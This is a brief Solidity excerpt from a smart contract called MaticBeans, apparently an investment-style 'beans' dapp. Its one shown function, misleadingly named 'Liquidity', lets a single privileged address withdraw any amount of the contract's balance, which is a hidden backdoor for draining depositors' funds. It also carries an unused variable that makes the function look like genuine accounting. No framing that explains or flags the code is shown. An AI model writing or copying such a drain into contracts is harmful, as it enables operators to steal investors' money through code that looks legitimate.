...
contract MaticBeans is Context, Ownable {
...
function Liquidity(uint256 amount) public{
		if (msg.sender == recAdd) {
		   uint256 totalInvested = address(this).balance.sub(amount);
			recAdd.transfer(amount);
		}
	}
